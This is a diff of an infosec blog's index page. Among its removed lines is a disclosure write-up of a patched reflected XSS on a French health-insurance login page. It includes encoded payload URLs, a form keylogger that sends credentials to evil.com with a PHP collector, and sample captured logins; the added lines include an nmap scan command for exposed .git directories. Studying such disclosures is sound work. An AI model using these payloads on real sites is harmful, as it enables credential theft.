@@ -9,7 +9,7 @@
 
   <title>
     
-      Lanyon &middot; A Jekyll theme
+      phackt.com:~# &middot; Let's talk about sec, baby!
     
   </title>
 
@@ -40,7 +40,7 @@
 <!-- Toggleable sidebar -->
 <div class="sidebar" id="sidebar">
   <div class="sidebar-item">
-    <p>A reserved <a href="https://jekyllrb.com" target="_blank">Jekyll</a> theme that places the utmost gravity on content with a hidden drawer. Made by <a href="https://twitter.com/mdo" target="_blank">@mdo</a>.</p>
+    <p>Some infosec stuff.</p>
   </div>
 
   <nav class="sidebar-nav">
@@ -60,7 +60,7 @@
     
       
         
-          <a class="sidebar-nav-item" href="http://localhost:4000/about/">About</a>
+          <a class="sidebar-nav-item" href="http://localhost:4000/about">About</a>
         
       
     
@@ -86,6 +86,10 @@
     
       
         
+      
+    
+      
+    
       
     
 
@@ -108,8 +112,8 @@
       <div class="masthead">
         <div class="container">
           <h3 class="masthead-title">
-            <a href="/" title="Home">Lanyon</a>
-            <small>A Jekyll theme</small>
+            <a href="/" title="Home">phackt.com:~#</a>
+            <small>Let's talk about sec, baby!</small>
           </h3>
         </div>
       </div>
@@ -119,7 +123,7 @@
   
   <div class="post">
     <h1 class="post-title">
-      <a href="http://localhost:4000/dev/2020/05/27/git-secrets-exposed/">
+      <a href="http://localhost:4000/git-secrets-exposed">
         What solutions to prevent git leaks ?
       </a>
     </h1>
@@ -131,12 +135,19 @@
 <p>I will do a quick and dirty post about what’s out there to find / prevent leaks of secrets in your git repositories.<br />
 I did not try all of these tools. For the search part, i’m mainly using a fork of Trufflehog with some added features (search in filenames, commits comments, also with custom regexes).</p>
 
+<h3 id="objectives-">Objectives :</h3>
+
+<ul>
+  <li>Look into the commits history for sensitive information publicly accessible by an attacker ;</li>
+  <li>Prevent secrets leaks ;</li>
+  <li>Monitoring and integrating these checks in the Continous Delivery process - aka DevSecOps</li>
+</ul>
 
   </div>
   
   <div class="post">
     <h1 class="post-title">
-      <a href="http://localhost:4000/web/2018/08/05/web-exposed-git-repositories/">
+      <a href="http://localhost:4000/web-exposed-git-repositories">
         Gathering some information from web exposed git repositories
       </a>
     </h1>
@@ -147,11 +158,14 @@ I did not try all of these tools. For the search part, i’m mainly using a fork
 
 <p>Last week, while i was doing recon on some websites, i noticed that we can still found some versioning repositories in production. I found some classic <strong>.git</strong> exposed, and in a lesser extent some <strong>.svn</strong> directories. I decided to gather a bunch of websites caught in the TOP Alexa in order to look for the proportion of .git exposed; with <strong>112332</strong> domains scanned (mixed TLDs), i found <strong>453</strong> .git exposed, which is only <strong>0.4%</strong>. Not bad.</p>
 
+<p>How to scan for web exposed git directories:<br />
+<code class="language-plaintext highlighter-rouge">nmap --open -PN -n -p80,81,82,8000,8080,443,8443,9443 --script http-git -oA http-git -iL domains.lst</code></p>
+
   </div>
   
   <div class="post">
     <h1 class="post-title">
-      <a href="http://localhost:4000/web/2017/12/24/play-with-permissive-cors/">
+      <a href="http://localhost:4000/play-with-permissive-cors">
         Play with permissive CORS
       </a>
     </h1>
@@ -162,15 +176,11 @@ I did not try all of these tools. For the search part, i’m mainly using a fork
 
 <p>While i was playing with a ‘code search engine’ tool called <a href="https://publicwww.com">publicwww</a>, i decided to gather some top Alexa domains and to look for some permissive CORS. I tried the following researches, <code class="language-plaintext highlighter-rouge">site:fr "type=\"password\""</code>, the same for the TLDs <em>.org</em> and <em>.com</em>, in order to spot webpages with a login form.</p>
 
-<p>I also looked for some other stuff like websites with french language and so on. I will let you play with publicwww, remember that you are limited with basic access but if you pay you will have access to the top 200000 Alexa websites dealing with your request. May be you also wanna play with Shodan or Censys.</p>
-
-<p><strong>Python tool to detect permissive CORS</strong></p>
-
   </div>
   
   <div class="post">
     <h1 class="post-title">
-      <a href="http://localhost:4000/web/2017/07/25/xss-real-life-case-credentials-stealing/">
+      <a href="http://localhost:4000/xss-real-life-case-credentials-stealing">
         A fun case of XSS and other web concepts
       </a>
     </h1>
@@ -181,141 +191,11 @@ I did not try all of these tools. For the search part, i’m mainly using a fork
 
 <p>I would like to share with you a practical case of reflected XSS while i was looking at my national health service account. Right now the XSS has been patched (we have an efficient dedicated national service where we can report such issues).</p>
 
-<p><strong>What is the issue:</strong><br />
-A reflected <a href="https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)">XSS</a> in the login field at the authentication page from the website https://assure.ameli.fr where all french citizen are consulting their social security account. Some digits are required but setting some alphacharacters as login will return the string in uppercase.</p>
-
-<p><strong>Where is the issue</strong><br />
-So i set:<br />
-<img src="http://localhost:4000/public/images/xss-practical-case/image1.png" alt="image1" /></p>
-
-<p>And i got:</p>
-<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;form</span> <span class="na">name=</span><span class="s">"connexionCompteForm"</span> <span class="na">id=</span><span class="s">"connexioncompte_2connexionCompteForm"</span> <span class="na">method=</span><span class="s">"post"</span> <span class="na">action=</span><span class="s">"https://assure.ameli.fr:443/PortailAS/appmanager/PortailAS/assure?_nfpb=true&amp;amp;_windowLabel=connexioncompte_2&amp;amp;connexioncompte_2_actionOverride=%2Fportlets%2Fconnexioncompte%2Fvalidationconnexioncompte&amp;amp;_pageLabel=as_login_page"</span> <span class="na">class=</span><span class="s">"r_cnx_form"</span><span class="nt">&gt;</span>
-...
-<span class="nt">&lt;input</span> <span class="na">id=</span><span class="s">"connexioncompte_2nir_as"</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">value=</span><span class="s">"THEPOSTLOGIN"</span> <span class="na">maxlength=</span><span class="s">"13"</span> <span class="na">size=</span><span class="s">"13"</span> <span class="na">placeholder=</span><span class="s">"Mon numéro de sécurité sociale"</span> <span class="na">title=</span><span class="s">"Mon numéro de sécurité sociale"</span> <span class="na">tabindex=</span><span class="s">"3"</span> <span class="na">name=</span><span class="s">"connexioncompte_2numSecuriteSociale"</span> <span class="nt">/&gt;</span>
-...
-<span class="nt">&lt;/form&gt;</span>
-</code></pre></div></div>
-
-<p>Let’s try something else with the login <strong>toto&lt;&gt;”’();/:</strong>:</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;input id="connexioncompte_2nir_as" type="text" value="TOTO&lt;&gt;"'();/\" maxlength="13" ...
-</code></pre></div></div>
-
-<p>No escaping, no sanitizing or HTML encoding but we will have to deal with UPPERCASE. HTML is not case sensitive but javascript is, so we will do some HEX encoding for the javascript part.</p>
-
-<p><strong>First payload:</strong><br />
-We can test the XSS thanks to this payload (alert):</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://assure.ameli.fr/PortailAS/appmanager/PortailAS/assure?connexioncompte_2numSecuriteSociale=" /&gt;&lt;IMG SRC=X ONERROR=&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;(&amp;#x64;&amp;#x6F;&amp;#x63;&amp;#x75;&amp;#x6D;&amp;#x65;&amp;#x6E;&amp;#x74;&amp;#x2E;&amp;#x64;&amp;#x6F;&amp;#x6D;&amp;#x61;&amp;#x69;&amp;#x6E;) hidden&gt;&lt;nimp "&amp;connexioncompte_2codeConfidentiel=&amp;connexioncompte_2actionEvt=connecter
-</code></pre></div></div>
-
-<p>Full payload url encoded:</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://assure.ameli.fr/PortailAS/appmanager/PortailAS/assure?connexioncompte_2numSecuriteSociale=%22%20%2F%3E%3CIMG%20SRC%3DX%20ONERROR%3D%26%23x61%3B%26%23x6C%3B%26%23x65%3B%26%23x72%3B%26%23x74%3B(%26%23x64%3B%26%23x6F%3B%26%23x63%3B%26%23x75%3B%26%23x6D%3B%26%23x65%3B%26%23x6E%3B%26%23x74%3B%26%23x2E%3B%26%23x64%3B%26%23x6F%3B%26%23x6D%3B%26%23x61%3B%26%23x69%3B%26%23x6E%3B)%20hidden%3E%3Cnimp%20%22&amp;connexioncompte_2codeConfidentiel=&amp;connexioncompte_2actionEvt=connecter
-</code></pre></div></div>
-
-<p><em>But wait… you process a GET request and you were talking about a form with POST method ?</em><br />
-Yes, there but there is no server-side filter on the specific POST method.</p>
-
-<p>So what do we have?<br />
-<img src="http://localhost:4000/public/images/xss-practical-case/image2.png" alt="image2" /></p>
-
-<p>It works because i’m using Firefox, IE and Chrome embed a reflected XSS auditor and will prevent this kind of javascript execution. Back to the javascript part, now we will just call our own javascript file. With our next payload, we will take care to keep the webpage as it is (no error message, keeping placeholder, …).</p>
-
-<p><strong>Second payload:</strong></p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>" name="connexioncompte_2numSecuriteSociale" placeholder="&amp;#x4d;&amp;#x6f;&amp;#x6e;&amp;#x20;&amp;#x6e;&amp;#x75;&amp;#x6d;&amp;#xe9;&amp;#x72;&amp;#x6f;&amp;#x20;&amp;#x64;&amp;#x65;&amp;#x20;&amp;#x73;&amp;#xe9;&amp;#x63;&amp;#x75;&amp;#x72;&amp;#x69;&amp;#x74;&amp;#xe9;&amp;#x20;&amp;#x73;&amp;#x6f;&amp;#x63;&amp;#x69;&amp;#x61;&amp;#x6c;&amp;#x65;" /&gt;&lt;script src='https://evil.com/poc/poc.js'&gt;&lt;/script&gt;&lt;nimp "
-</code></pre></div></div>
-
-<p>Full payload url encoded:</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://assure.ameli.fr/PortailAS/appmanager/PortailAS/assure?connexioncompte_2numSecuriteSociale=%22%20name%3D%22connexioncompte_2numSecuriteSociale%22%20placeholder%3D%22%26%23x4d%3B%26%23x6f%3B%26%23x6e%3B%26%23x20%3B%26%23x6e%3B%26%23x75%3B%26%23x6d%3B%26%23xe9%3B%26%23x72%3B%26%23x6f%3B%26%23x20%3B%26%23x64%3B%26%23x65%3B%26%23x20%3B%26%23x73%3B%26%23xe9%3B%26%23x63%3B%26%23x75%3B%26%23x72%3B%26%23x69%3B%26%23x74%3B%26%23xe9%3B%26%23x20%3B%26%23x73%3B%26%23x6f%3B%26%23x63%3B%26%23x69%3B%26%23x61%3B%26%23x6c%3B%26%23x65%3B%22%20%2F%3E%3Cscript%20src%3D%27https%3A%2F%2Fevil.com%2Fpoc%2Fpoc.js%27%3E%3C%2Fscript%3E%3Cnimp%20%22&amp;connexioncompte_2codeConfidentiel=&amp;connexioncompte_2actionEvt=connecter
-</code></pre></div></div>
-
-<p>On our apache we are creating the web tree <em>POC/POC.JS</em> (scheme and domain name are not case sensitive). But does a little bird sing the word CORS (Cross-Origin Resource Sharing)?</p>
-
-<p>Here are some examples of resources which may be embedded cross-origin (<a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy">https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy</a>):</p>
-<ul>
-  <li>JavaScript with <code class="language-plaintext highlighter-rouge">&lt;script src="..."&gt;&lt;/script&gt;</code>. Error messages for syntax errors are only available for same-origin scripts.</li>
-  <li>CSS with <code class="language-plaintext highlighter-rouge">&lt;link rel="stylesheet" href="..."&gt;</code>. Due to the relaxed syntax rules of CSS, cross-origin CSS requires a correct Content-Type header. Restrictions vary by browser: IE, Firefox, Chrome, Safari (scroll down to CVE-2010-0051) and Opera.</li>
-  <li>Images with <code class="language-plaintext highlighter-rouge">&lt;img&gt;</code>. Supported image formats include PNG, JPEG, GIF, BMP, SVG, …</li>
-  <li>Media files with <code class="language-plaintext highlighter-rouge">&lt;video&gt;</code> and <code class="language-plaintext highlighter-rouge">&lt;audio&gt;</code>.</li>
-  <li>Plug-ins with <code class="language-plaintext highlighter-rouge">&lt;object&gt;</code>, <code class="language-plaintext highlighter-rouge">&lt;embed&gt;</code> and <code class="language-plaintext highlighter-rouge">&lt;applet&gt;</code>.</li>
-  <li>Fonts with <code class="language-plaintext highlighter-rouge">@font-face</code>. Some browsers allow cross-origin fonts, others require same-origin fonts.</li>
-  <li>Anything with <code class="language-plaintext highlighter-rouge">&lt;frame&gt;</code> and <code class="language-plaintext highlighter-rouge">&lt;iframe&gt;</code>. A site can use the X-Frame-Options header to prevent this form of cross-origin interaction.</li>
-</ul>
-
-<p>But in fact whatever… we are owning the web server we would be able to add if it was necessary the response header <code class="language-plaintext highlighter-rouge">access-control-allow-origin: *</code> for any ressources.</p>
-
-<p>But what kind of cool javascript payload can we inject? (knowing that the JSESSIONID cookie has the flag HttpOnly so not accessible via javascript).</p>
-
-<p><img src="http://localhost:4000/public/images/xss-practical-case/image3.png" alt="image3" /></p>
-
-<p>We will add a callback function that will be executed once the web page forms will be submitted (allowing us to capture the credentials). Check <a href="https://github.com/phackt/pentest/tree/master/exploits/js_keylogger">https://github.com/phackt/pentest/tree/master/exploits/js_keylogger</a> for source code.</p>
-
-<p><strong>POC.JS</strong>:</p>
-<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">window</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
-	<span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nx">i</span><span class="o">&lt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">){</span>
-	  	<span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">addEventListener</span><span class="p">(</span><span class="dl">"</span><span class="s2">submit</span><span class="dl">"</span><span class="p">,</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
-	  		<span class="k">for</span><span class="p">(</span><span class="nx">e</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nx">e</span><span class="o">&lt;</span><span class="k">this</span><span class="p">.</span><span class="nx">elements</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">e</span><span class="o">++</span><span class="p">){</span>
-	  			<span class="nx">keys</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">[name:</span><span class="dl">"</span> <span class="o">+</span> <span class="k">this</span><span class="p">.</span><span class="nx">elements</span><span class="p">[</span><span class="nx">e</span><span class="p">].</span><span class="nx">name</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">,value:</span><span class="dl">"</span> <span class="o">+</span> <span class="k">this</span><span class="p">.</span><span class="nx">elements</span><span class="p">[</span><span class="nx">e</span><span class="p">].</span><span class="nx">value</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">,type:</span><span class="dl">"</span> <span class="o">+</span> <span class="k">this</span><span class="p">.</span><span class="nx">elements</span><span class="p">[</span><span class="nx">e</span><span class="p">].</span><span class="nx">type</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">]</span><span class="dl">"</span><span class="p">;</span>
-	  			<span class="k">new</span> <span class="nx">Image</span><span class="p">().</span><span class="nx">src</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">https://evil.com/key.php?c=</span><span class="dl">'</span><span class="o">+</span><span class="nx">keys</span><span class="p">;</span>
-	  		<span class="p">}</span>
-    	<span class="p">},</span> <span class="kc">false</span><span class="p">);</span>
-	<span class="p">}</span>
-<span class="p">}</span>
-</code></pre></div></div>
-
-<p><strong>key.php</strong>:</p>
-<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
-<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">empty</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'c'</span><span class="p">]))</span> <span class="p">{</span>
-    <span class="nv">$logfile</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="s1">'data.txt'</span><span class="p">,</span> <span class="s1">'a+'</span><span class="p">);</span>
-    <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$logfile</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'c'</span><span class="p">]</span><span class="o">.</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">);</span>
-    <span class="nb">fclose</span><span class="p">(</span><span class="nv">$logfile</span><span class="p">);</span>
-<span class="p">}</span>
-<span class="cp">?&gt;</span>
-</code></pre></div></div>
-
-<p>So suppose you are receiving a link which exploits the XSS vulnerability and you innocently enter your credentials to check your account, the attacker will receive:</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[name:CONNEXIONCOMPTE_2NUMSECURITESOCIALE,value:1234567890123,type:text]
-[name:connexioncompte_2codeConfidentiel,value:89769874,type:password]
-[name:connexioncompte_2actionEvt,value:connecter,type:hidden]
-[name:submit,value:Valider,type:submit]
-</code></pre></div></div>
-
-<p>This kind of vulnerability could be part of a phishing campaign which encourages people to log in by clicking on the malicious link.</p>
-
-<p><strong>COUNTERMEASURES</strong>:</p>
-<ul>
-  <li>HTML Encoding (HTML entities and numeric character references) - <a href="https://en.wikipedia.org/wiki/Character_encodings_in_HTML">https://en.wikipedia.org/wiki/Character_encodings_in_HTML</a></li>
-  <li>Sanitizing</li>
-  <li>Escaping</li>
-  <li>White-listing</li>
-  <li>Explicit X-XSS-Protection header (<a href="https://developer.mozilla.org/fr/docs/Web/HTTP/Headers/X-XSS-Protection">https://developer.mozilla.org/fr/docs/Web/HTTP/Headers/X-XSS-Protection</a>)</li>
-  <li>Only POST requests for sensitive operations</li>
-</ul>
-
-<p>Blocking all cross domains requests via a Content Security Policy rule (<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP</a>) may be not relevant because a lot of these ressources are legitimate on a website. However we can do some subtle CSP rules in order to allow only what is needed.<br />
-But if a web site administrator wants all content to come from the site’s own origin (this excludes subdomains):</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Content-Security-Policy: default-src 'self'
-</code></pre></div></div>
-
-<p><strong>UPDATE 21/09/2017</strong>:<br />
-Apparently some waf is now blacklisting some malicious strings:</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wafw00f https://assure.ameli.fr/
-...
-The site https://assure.ameli.fr/ is behind a F5 BIG-IP APM
-</code></pre></div></div>
-
-<p>Unfortunately the special characters are still not html encoded (test with <code class="language-plaintext highlighter-rouge">'';!--"&lt;XSS&gt;=&amp;{()}</code>).<br />
-Feel free to try to bypass it and let me know.</p>
-
-<p>Web applications are really interesting because of all the concepts you have to deal with.</p>
-
-<p>Hope you enjoyed.</p>
-
-<p>Phackt.</p>
-
   </div>
   
   <div class="post">
     <h1 class="post-title">
-      <a href="http://localhost:4000/web/2017/06/05/fingerprint-web-application-static-files/">
+      <a href="http://localhost:4000/fingerprint-web-application-static-files">
         Fingerprinting Web Application static files
       </a>
     </h1>
@@ -329,130 +209,6 @@ Feel free to try to bypass it and let me know.</p>
 <p><strong>So what the hell am i talking about?</strong></p>
 
 <p>Ok let me explain the context: You are looking at a website and trying to get the exact version of the underlying CMS, let say Drupal. We know that Drupal has suffered from the <a href="https://www.drupal.org/project/drupalgeddon">Drupalgeddon</a> for versions 7.X before 7.32. So you can have at look at some obvious files (CHANGELOG.txt), but what happens if the webmaster deleted these files? How to maximize the chance to find the right version or at least the smallest delta as possible ?</p>
-
-<p>A tool was existing for that purpose, <a href="https://github.com/lokifer/BlindElephant">BlindElephant</a>, but it is not maintained anymore. So i chose to write my own script matching my needs (hand made with love). Of course don’t hesitate to contact me and let me know if you took time to have BlindElephant in a working state with the CMS hashes databases up-to-date.</p>
-
-<p>So now after your recon phase you have your target using Drupal CMS (it will work with any CMS files versioned on GIT). Here we will install a Drupal on our local machine.<br />
-<a href="https://github.com/jekyc/wig">WebApp Information Gatherer</a> may helps your to identify it:</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./wig.py http://localhost/drupal
-...
-Name           Versions          Type               
-Drupal         7                 CMS   
-...
-</code></pre></div></div>
-
-<p>Of course if you can hit some files leaking the CMS version, in this case everything is already folded:</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl --silent http://localhost/drupal/CHANGELOG.txt | head -1
-Drupal 7.29, 2014-07-16
-</code></pre></div></div>
-
-<p>You also can look for some obvious information in the response headers or for any meta information in the HTML page. But if the webmaster did its job, nothing will leak so how can we fingerprint our CMS?</p>
-
-<p>What do you need:</p>
-<ul>
-  <li>access to versioned project</li>
-  <li>find the most relevant (updated) files as input files (git log)</li>
-  <li>download these files from your target</li>
-  <li>hash all these input files and their GIT releases equivalent</li>
-  <li>compare input files hashes with the releases ones</li>
-</ul>
-
-<p>Following all these steps will help to determine the most likely versions of the underlying CMS.</p>
-
-<p>So first download the last version of <a href="https://raw.githubusercontent.com/phackt/pentest/master/fingerprint/web/versionchecker.sh">versionchecker.sh</a>:</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /tmp <span class="o">&amp;&amp;</span> wget https://raw.githubusercontent.com/phackt/pentest/master/fingerprint/web/versionchecker.sh
-<span class="nb">chmod</span> +x versionchecker.sh
-</code></pre></div></div>
-
-<p>Then clone the <a href="https://github.com/drupal/drupal">Drupal repo</a>:</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/drupal/drupal.git
-<span class="nb">cd </span>drupal/
-</code></pre></div></div>
-
-<p>Now we will look for our relevant input files:</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git log <span class="nt">--all</span> <span class="nt">--pretty</span><span class="o">=</span>format: <span class="nt">--name-only</span> | egrep <span class="nt">-v</span> <span class="s2">"^core/"</span> | egrep <span class="nt">-i</span> <span class="s2">"(.js</span><span class="nv">$|</span><span class="s2">.html</span><span class="nv">$|</span><span class="s2">.css</span><span class="nv">$)</span><span class="s2">"</span> | <span class="nb">sort</span> | <span class="nb">uniq</span> <span class="nt">-c</span> | <span class="nb">sort</span> <span class="nt">-rg</span> | <span class="nb">head</span> <span class="nt">-30</span> | <span class="nb">tee</span> /tmp/relevant_files.txt
-warning: inexact rename detection was skipped due to too many files.
-warning: you may want to <span class="nb">set </span>your diff.renameLimit variable to at least 4708 and retry the command.
-    170 misc/drupal.css
-    106 themes/seven/style.css
-    106 themes/garland/style.css
-    102 misc/drupal.js
-     85 modules/system/system.css
-     78 modules/overlay/overlay-parent.js
-     72 themes/bartik/css/style.css
-     67 misc/tabledrag.js
-     57 misc/autocomplete.js
-     55 themes/xtemplate/xtemplate.css
-     55 modules/system/system.js
-     52 misc/ajax.js
-     42 misc/collapse.js
-     41 misc/textarea.js
-     41 misc/tableheader.js
-     37 themes/pushbutton/style.css
-     35 themes/bluemarine/style.css
-     35 modules/user/user.js
-     35 misc/progress.js
-     33 modules/user/user.css
-     32 modules/toolbar/toolbar.css
-     30 misc/tableselect.js
-     29 modules/system/admin.css
-     28 themes/garland/style-rtl.css
-     28 misc/jquery.js
-     26 modules/color/color.js
-     26 modules/block/block.js
-     25 misc/teaser.js
-     24 themes/bartik/css/style-rtl.css
-     24 modules/node/node.css
-     23 themes/chameleon/common.css
-     23 modules/toolbar/toolbar.js
-     23 modules/system/system-rtl.css
-     22 modules/dashboard/dashboard.css
-     22 misc/ahah.js
-     21 themes/garland/fix-ie.css
-     20 themes/xtemplate/pushbutton/xtemplate.css
-     20 modules/overlay/overlay-parent.css
-     20 modules/openid/openid.js
-     20 modules/book/book.css
-</code></pre></div></div>
-
-<p>We are looking for the most commited static files (.js, .html, .css), not beginning by <em>core/</em> (Drupal 8 hierarchy, we are looking for a Drupal 7 version here) and saving the results in <em>/tmp/relevant_files.txt</em>.</p>
-
-<p>Let’s download these files from our target in order to be processed by the <strong>versionchecker.sh</strong>:</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir</span> ../input <span class="o">&amp;&amp;</span> <span class="nb">cd</span> ../input
-<span class="k">for </span>file <span class="k">in</span> <span class="si">$(</span><span class="nb">cat</span> /tmp/relevant_files.txt | <span class="nb">sed</span> <span class="nt">-r</span> <span class="s1">'s/^ +//g'</span> | <span class="nb">cut</span> <span class="nt">-d</span><span class="s1">' '</span> <span class="nt">-f2</span><span class="si">)</span><span class="p">;</span><span class="k">do </span><span class="nb">mkdir</span> <span class="nt">-p</span> <span class="si">$(</span><span class="nb">dirname</span> <span class="nv">$file</span><span class="si">)</span> 2&gt;/dev/null<span class="p">;</span>wget <span class="nt">-O</span> <span class="nv">$file</span> <span class="s2">"http://localhost/drupal/</span><span class="nv">$file</span><span class="s2">"</span><span class="p">;</span><span class="k">done</span>
-</code></pre></div></div>
-
-<p>In the input directory we need to keep the hierarchy of relevant files in order to find them in the GIT repo. Some files may not be found for the target release. As an option, you can pass a pattern to grep the tags you want after the script has executed the <code class="language-plaintext highlighter-rouge">git tag</code> command (to find all the releases).</p>
-
-<p>Let’s run our <strong>versionchecker.sh</strong> (currently only working for git versioning system):<br />
-```bash
-cd .. &amp;&amp; ./versionchecker.sh -s ./input/ -g ./drupal/ -p “^[78].[0-9.]+$”
-[<em>] Input files directory: /tmp/input
-[</em>] Cleaning empty files and directory in /tmp/input - Done
-[<em>] GIT repository: /root/Documents/repo/drupal
-[</em>] Grep pattern: ^7.[0-9]+$
-        <strong>_           ___           ___           ___                       ___           ___     <br />
-       /_<em>\         /\  \         /\  \         /\  \          __</em>        /\  \         /_<em>\    <br />
-      /:/  /        /::\  \       /::\  \       /::\  \        /\  \      /::\  \       /::|  |   <br />
-     /:/  /        /:/:\  \     /:/:\  \     /:/\ \  \       :\  \    /:/:\  \     /:|:|  |   <br />
-    /:/__/  __</em>   /::~:\  \   /::~:\  \   <em>:~\ \  \      /::_</em>\  /:/  :\  \   /:/|:|  |</strong> <br />
-    |:|  | /_<em>\ /:/:\ :_</em>\ /:/:\ :_<em>\ /\ :\ \ _</em>\  <strong>/:/\/</strong>/ /:/<strong>/ :_<em>\ /:/ |:| /_</em>\<br />
-    |:|  |/:/  / :~:\ \/</strong>/ \/<em>|::\/:/  / :\ :\ \/<strong>/ /\/:/  /    :\  \ /:/  / \/</strong>|:|/:/  /<br />
-    |:|<strong>/:/  /   :\ :__\      |:|::/  /   :\ :__\   ::/</strong>/      :\  /:/  /      |:/:/  / <br />
-     ::::/<strong>/     :\ \/</strong>/      |:|\/<strong>/     :\/:/  /    :__\       :\/:/  /       |::/  /  <br />
-      ~~~~          :__\        |:|  |        ::/  /      \/</strong>/        ::/  /        /:/  /   <br />
-                     \/<strong>/         |</strong>|         \/<strong>/                     \/</strong>/         \/<strong>/    <br />
-        ___           ___           ___           ___           ___           ___           ___   <br />
-       /\  \         /__\         /\  \         /\  \         /__\         /\  \         /\  \  <br />
-      /::\  \       /:/  /        /::\  \       /::\  \       /:/  /        /::\  \       /::\  \ <br />
-     /:/:\  \     /:/</strong>/        /:/:\  \     /:/:\  \     /:/<strong>/        /:/:\  \     /:/:\  \<br />
-    /:/  :\  \   /::\  \ ___   /::~:\  \   /:/  :\  \   /::___</strong></em>   /::~:\  \   /::~:\  \ 
-   /:/<strong>/ :_<em>\ /:/:\  /_</em>\ /:/:\ :_<em>\ /:/__/ :_</em>\ /:/:::::_<em>\ /:/:\ :_</em>\ /:/:\ :_<em><br />
-   :\  \  \/__/ \/__:\/:/  / :~:\ \/__/ :\  \  \/__/ \/</em>|:|~~|~    :~:\ \/</strong>/ \/<em>|::\/:/  /
-    :\  \            ::/  /   :\ :_</em>\    :\  \          |:|  |      :\ :__\      |:|::/  / 
-     :\  \           /:/  /     :\ \/<strong>/     :\  \         |:|  |       :\ \/</strong>/      |:|\/<strong>/<br />
-      :_<em>\         /:/  /       :_</em>\        :_<em>\        |:|  |        :_</em>\        |:|  |  <br />
-       \/</strong>/         \/<strong>/         \/</strong>/         \/<strong>/         |</strong>|         \/<strong>/         |</strong>|</p>
 
   </div>
   
